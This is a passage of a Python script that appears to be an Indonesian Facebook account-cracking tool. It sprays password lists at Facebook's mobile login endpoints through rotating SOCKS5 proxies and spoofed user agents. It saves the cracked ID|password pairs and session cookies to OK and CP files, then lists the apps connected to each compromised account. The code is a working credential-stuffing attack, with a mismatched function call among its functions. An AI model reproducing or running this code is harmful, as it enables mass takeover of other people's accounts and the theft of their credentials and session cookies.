			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="112"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				os.popen('play-audio data/cp')
				print(f'\r{O}□┈┈➤{K} {idf}|{pw}{O} {U}<//> {O}{tahun(idf)}\n└➤{K} {ua}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')			
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				os.popen('play-audio data/ok')
				print(f'\r{O}□┈┈➤{H} {idf}|{pw}{O} {U}<//> {O}{tahun(idf)}\n└➤{H} {kuki}\n□┈┈➤ {H}{ua}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kukis)
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def method_Async(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write(f"\r{P}[{bo}ACHA-CNZ{P}] {h}{P}{b}{loop}{P}/{P}{len(id)}{P} {hh}OK:{P}{ok}{P} {kk}CP:{P}{cp}{P} {bo}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="112"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host": "m.facebook.com",
"content-length": f"{len(str(dataa))}",
"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
"origin": "https://m.facebook.com",
"content-type": "application/x-www-form-urlencoded",
"user-agent": ua,
"accept": "*/*",
"x-requested-with": "com.microsoft.bing",
"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
"sec-ch-ua-platform": '"Android"',
"sec-ch-ua-mobile": "?1",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"sec-fetch-user": "?1",
"referer": "https://m.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
"accept-encoding": "gzip, deflate br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				os.popen('play-audio data/cp')
				print(f'\r{O}□┈┈➤{K} {idf}|{pw}{O} {U}<//> {O}{tahun(idf)}\n└➤{K} {ua}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')			
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				os.popen('play-audio data/ok')
				print(f'\r{O}□┈┈➤{H} {idf}|{pw}{O} {U}<//> {O}{tahun(idf)}\n└➤{H} {kuki}\n□┈┈➤ {H}{ua}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kukis)
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
### APLIKASI ###
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

### CONTROL SYSTEM ###
if __name__=='__main__':
	try:os.system('clear')
	except:pass
	try:os.system('git clone https://github.com/aldii-ls/data')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir("ACHA-DUMP")
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	jalan(f'{H}Jangan Lupa Bersyukur')
	login()
#JANGAN HAPUS CREDIT NYA YA KONTOL#